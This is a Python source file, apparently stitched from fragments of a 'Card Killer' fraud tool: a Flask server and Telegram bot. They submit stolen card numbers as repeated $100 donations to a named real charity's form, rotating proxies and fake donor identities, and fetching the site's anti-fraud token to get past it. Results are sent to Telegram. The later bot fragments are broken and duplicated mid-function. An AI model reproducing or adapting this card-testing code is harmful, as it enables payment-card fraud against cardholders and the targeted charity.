/storage/emulated/0/OUTCOME/KILLERCODE/    {"first": "Linda", "last": "Harris", "address": "222 Dogwood Ln", "city": "Dallas", "state": "TX", "zip": "75201"},
    {"first": "Charles", "last": "Martin", "address": "321 Holly Blvd", "city": "Los Angeles", "state": "CA", "zip": "90001"},
]

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class CardKiller:
    def __init__(self):
        self.session = requests.Session()
        self.proxy_list = PROXY_LIST.copy()
        self.fake_details_pool = FAKE_DETAILS_POOL.copy()
    
    def get_random_details(self) -> Dict:
        """Get random fake user details"""
        return random.choice(self.fake_details_pool)
    
    def get_random_email(self, first_name: str, last_name: str) -> str:
        """Generate random email address"""
        domain = random.choice(["gmail.com", "yahoo.com", "outlook.com", "proton.me", "hotmail.com"])
        number = random.randint(100, 999)
        return f"{first_name.lower()}.{last_name.lower()}{number}@{domain}"
    
    def get_proxy(self) -> Optional[Dict]:
        """Get random proxy from list"""
        if not self.proxy_list:
            return None
        proxy_str = random.choice(self.proxy_list)
        return {
            'http': f'http://{proxy_str}',
            'https': f'http://{proxy_str}'
        }
    
    def remove_proxy(self, proxy: Dict):
        """Remove bad proxy from list"""
        proxy_str = proxy['http'].split('//')[1]
        if proxy_str in self.proxy_list:
            self.proxy_list.remove(proxy_str)
            logger.warning(f"Removed bad proxy: {proxy_str}")
    
    def get_fraud_token(self, proxy: Dict) -> Optional[str]:
        """Get fraud token from the website"""
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://secure.farmsanctuary.org',
            'referer': 'https://secure.farmsanctuary.org/donate',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'js_module': 'springboard_fraud',
            'js_callback': 'get_token',
            'form_id': 'webform_client_form_442'
        }
        
        try:
            response = self.session.post(
                'https://secure.farmsanctuary.org/js/springboard_fraud/get_token',
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=30
            )
            return response.json() if response.status_code == 200 else None
        except Exception as e:
            logger.error(f"Error getting fraud token: {e}")
            return None
    
    def process_payment(self, cc: str, mm: str, yy: str, cvv: str, proxy: Dict) -> Dict:
        """Process single payment attempt"""
        try:
            # Format year if needed
            if len(yy) == 4:
                yy = yy[-2:]
            
            # Get random details
            details = self.get_random_details()
            email = self.get_random_email(details["first"], details["last"])
            
            # Get fraud token
            fraud_token = self.get_fraud_token(proxy)
            if not fraud_token:
                return {"status": "Declined", "response": "Failed to get fraud token"}
            
            # Prepare final request
            headers = {
                'origin': 'https://secure.farmsanctuary.org',
                'referer': 'https://secure.farmsanctuary.org/donate',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
            }
            
            form_data = {
                'submitted[donation][amount]': '100',
                'submitted[donor_information][first_name]': details["first"],
                'submitted[donor_information][last_name]': details["last"],
                'submitted[donor_information][mail]': email,
                'submitted[billing_information][address]': details["address"],
                'submitted[billing_information][city]': details["city"],
                'submitted[billing_information][state]': details["state"],
                'submitted[billing_information][zip]': details["zip"],
                'submitted[billing_information][country]': 'US',
                'submitted[payment_information][payment_method]': 'credit',
                'submitted[payment_information][payment_fields][credit][card_number]': cc,
                'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_month]': mm,
                'submitted[payment_information][payment_fields][credit][expiration_date][card_expiration_year]': f'20{yy}',
                'submitted[payment_information][payment_fields][credit][card_cvv]': cvv,
                'form_id': 'webform_client_form_442',
                'springboard_fraud_token': fraud_token,
            }
            
            # Send payment request
            response = self.session.post(
                'https://secure.farmsanctuary.org/donate',
                headers=headers,
                data=form_data,
                proxies=proxy,
                timeout=30
            )
            
            # Parse response
            return self.parse_response(response.text)
            
        except requests.exceptions.ProxyError:
            return {"status": "Proxy Error", "response": "Proxy connection failed"}
        except requests.exceptions.RequestException as e:
            return {"status": "Network Error", "response": f"Network error: {str(e)}"}
        except Exception as e:
            return {"status": "Error", "response": f"Unexpected error: {str(e)}"}
    
    def parse_response(self, html_text: str) -> Dict:
        """Parse HTML response to determine status"""
        # Check for error messages
        error_match = re.search(r'<div class="messages error.*?>(.*?)</div>', html_text, re.DOTALL)
        if error_match:
            error_text = re.sub('<[^<]+?>', '', error_match.group(1)).strip()
            return {"status": "Declined", "response": error_text}
        
        # Check for success message
        elif "Thank you for your gift" in html_text or "donation successful" in html_text.lower():
            return {"status": "Approved", "response": "Donation successful. Card is live."}
        
        # Check for other success indicators
        elif "success" in html_text.lower() or "thank you" in html_text.lower():
            return {"status": "Approved", "response": "Payment processed successfully."}
        
        else:
            return {"status": "Declined", "response": "Unknown response from website."}
    
    def get_bin_info(self, bin_number: str) -> Dict:
        """Get BIN information for the card"""
        try:
            response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            logger.error(f"Error getting BIN info: {e}")
        return {}

def send_telegram_message(chat_id: int, message_id: int, text: str):
    """Send message to Telegram with retry mechanism"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            response = requests.post(
                TELEGRAM_API_URL,
                json={
                    'chat_id': chat_id,
                    'message_id': message_id,
                    'text': text,
                    'parse_mode': 'HTML'
                },
                timeout=15  # Increased timeout
            )
            
            if response.status_code == 200:
                logger.info(f"Telegram message sent successfully (attempt {attempt + 1})")
                return True
            else:
                logger.warning(f"Telegram API error: {response.status_code} - {response.text}")
                
        except requests.exceptions.Timeout:
            logger.warning(f"Telegram timeout (attempt {attempt + 1})")
        except requests.exceptions.ConnectionError:
            logger.warning(f"Telegram connection error (attempt {attempt + 1})")
        except Exception as e:
            logger.error(f"Telegram send error (attempt {attempt + 1}): {e}")
        
        # Wait before retry
        if attempt < max_retries - 1:
            time.sleep(2)
    
    logger.error(f"Failed to send Telegram message after {max_retries} attempts")
    return False

def background_task(chat_id: int, message_id: int, full_cc_string: str):
    """Background task to process card killing"""
    killer = CardKiller()
    final_status = "Card Not Killed"
    last_response = "No attempts made"
    
    try:
        # Parse card details
        parts = full_cc_string.split('|')
        if len(parts) != 4:
            raise ValueError("Invalid card format. Expected: cc|mm|yy|cvv")
        
        cc, mm, yy, cvv = parts
        
        # Process multiple attempts
        for attempt in range(1, 16):
            if not killer.proxy_list:
                last_response = "All proxies have failed"
                break
            
            proxy = killer.get_proxy()
            result = killer.process_payment(cc, mm, yy, cvv, proxy)
            
            status = result.get('status', 'Unknown')
            response_msg = result.get('response', 'No response')
            last_response = response_msg
            
            logger.info(f"Attempt {attempt}: {status} - {response_msg}")
            
            # Handle proxy errors
            if status == "Proxy Error":
                killer.remove_proxy(proxy)
                continue
            
            # Check results
            if status == "Approved":
                final_status = f"Card is Live (Approved on attempt {attempt})"
                break
            elif "declined" in response_msg.lower():
                final_status = f"Card Killed in {attempt} attempts"
                break
            elif "insufficient funds" in response_msg.lower():
                final_status = f"Card Killed in {attempt} attempts (Insufficient Funds)"
                break
            elif attempt == 15:
                final_status = "Card Not Killed after 15 attempts"
            
            # Wait before next attempt
            time.sleep(random.uniform(1, 3))
    
    except Exception as e:
        logger.error(f"Error in background task: {e}")
        final_status = "Processing Error"
        last_response = str(e)
    
    # Get BIN information and send result
    try:
        bin_info = killer.get_bin_info(cc[:6])
        final_message = format_result_message(full_cc_string, final_status, last_response, bin_info)
        
        # Send to Telegram with retry
        send_telegram_message(chat_id, message_id, final_message)
        
    except Exception as e:
        logger.error(f"Error formatting/sending result: {e}")

def format_result_message(card: str, status: str, response: str, bin_info: Dict) -> str:
    """Format the final result message for Telegram"""
    brand = bin_info.get('brand', 'Unknown')
    card_type = bin_info.get('type', 'Unknown')
    country = bin_info.get('country_name', 'Unknown')
    country_flag = bin_info.get('country_flag', '')
    bank = bin_info.get('bank', 'Unknown')
    
    return f"""<b>💳 Card Killer Result 🔪</b>

<b>𝗖𝗮𝗿𝗱:</b> <code>{card}</code>
<b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}
<b>𝐋𝐚𝐬𝐭 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:</b> {response}

<b>𝗜𝗻𝗳𝗼:</b> {brand} - {card_type}
<b>𝐈𝐬𝐬𝐮𝐞𝐫:</b> {bank}
<b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</b> {country} {country_flag}

<i>Powered by @diwazz</i>"""

@app.route('/kill', methods=['POST'])
def kill_endpoint():
    """Main endpoint for card killing requests"""
    try:
        data = request.get_json()
        
        if not data or 'card' not in data:
            return jsonify({"error": "Missing card data"}), 400
        
        required_fields = ['chat_id', 'message_id', 'card']
        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing required field: {field}"}), 400
        
        # Validate card format
        card_parts = data['card'].split('|')
        if len(card_parts) != 4:
            return jsonify({"error": "Invalid card format. Expected: cc|mm|yy|cvv"}), 400
        
        # Start background processing
        thread = threading.Thread(
            target=background_task,
            args=(data['chat_id'], data['message_id'], data['card'])
        )
        thread.daemon = True
        thread.start()
        
        logger.info(f"Started kill process for card: {data['card']}")
        
        return jsonify({
            "status": "success",
            "message": "Kill process started in background",
            "card": data['card'][:8] + "****"  # Mask card for security
        })
    
    except Exception as e:
        logger.error(f"Error in kill endpoint: {e}")
        return jsonify({"error": "Internal server error"}), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({
        "status": "healthy",
        "service": "Card Killer v2",
        "timestamp": time.time()
    })

if __name__ == '__main__':
    logger.info("Starting Card Killer v2 Server...")
    app.run(host='0.0.0.0', port=10000, debug=False)    except IndexError:
        bot.reply_to(message, "⚠️ Format: /kill CC|MM|YY|CVV")
        return

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', command_text)
    if not match:
        bot.reply_to(message, "❌ Invalid format.")
        return

    full_cc = match.group(0)
    payload = {'card': full_cc}

    try:
        response = requests.post("https://killbot-a7mt.onrender.com/kill", json=payload)
        bot.reply_to(message, f"✅ Response:\n<code>{response.text}</code>", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"🚫 Error: {e}")

# --- Run Telegram bot in background ---
def run_bot():
    bot.polling(none_stop=True)

threading.Thread(target=run_bot).start()
    sent_message = bot.reply_to(message, f"<i>Kill initiated for <code>{masked}|{match.group(2)}|{match.group(3)}|{match.group(4)}</code>. Please wait...</i>", parse_mode='HTML')

    payload = {
        'chat_id': message.chat.id,
        'message_id': sent_message.message_id,
        'card': full_cc_string
    }

    headers = {
        'Content-Type': 'application/json',
        # add an authorization header if API expects it:
        # 'Authorization': 'Bearer YOUR_API_KEY'
    }

    try:
        resp = requests.post(API_URL, json=payload, headers=headers, timeout=20)
    except requests.exceptions.RequestException as e:
        logging.exception("Request to API failed")
        bot.edit_message_text(f"<b>Error:</b> Could not contact API. <code>{e}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
        return

    # useful debug: include resp.text in logs (don't print sensitive data publicly)
    logging.info("API status: %s body: %s", resp.status_code, resp.text[:1000])

    if resp.status_code == 200:
        bot.edit_message_text(f"<b>Done:</b> API accepted the task. Response: <code>{resp.text}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    elif resp.status_code == 405:
        bot.edit_message_text("<b>Error:</b> API replied 405 Method Not Allowed. "
                              "That means this endpoint doesn't accept the method you used (POST/GET mismatch).",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(f"<b>Error:</b> API responded with status {resp.status_code}. Response body: <code>{resp.text}</code>",
                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')

if __name__ == "__main__":
    bot.polling(none_stop=True)
